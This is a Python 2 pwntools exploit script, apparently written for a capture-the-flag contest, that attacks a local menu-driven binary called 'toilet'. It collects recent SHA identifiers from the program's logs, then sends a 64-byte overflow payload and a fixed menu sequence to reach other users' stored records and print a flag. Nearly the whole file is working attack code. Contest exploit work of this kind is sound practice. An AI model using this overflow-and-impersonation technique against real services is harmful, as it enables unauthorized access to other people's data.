#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import re

import dateutil.parser

from pwn import *

context(arch='amd64', os='linux')


def get_latest_shas(io):
    io.sendline('8')
    io.recvuntil('#################################################################################################')
    logs = io.recvuntil('#################################################################################################')
    shas = re.findall('#==== (.{64}) ====', logs)[1:]
    # filter out shas older than 15 minutes
    times = [dateutil.parser.parse(time) for time in re.findall('==== (........) ====', logs)[1:]]
    youngest_time = times[0]
    return filter(lambda (_, time): (youngest_time - time).seconds <= (15 * 60), zip(shas, times))


with process('./toilet') as io:
    latest_shas = get_latest_shas(io)
for sha, _ in latest_shas:
    with process('./toilet') as io:
        io.sendline('1')
        io.sendline(fit(length=64))
        io.sendline('5')
        io.send('\n')
        io.sendline(sha)
        io.sendline('7')
        io.sendline('4')

        io.recvuntil('Name: ', timeout=3)
        flag = io.recvregex(r'FAUST_[A-Za-z0-9/\+]{32}', exact=True, timeout=3)
        if flag:
            print flag
            break
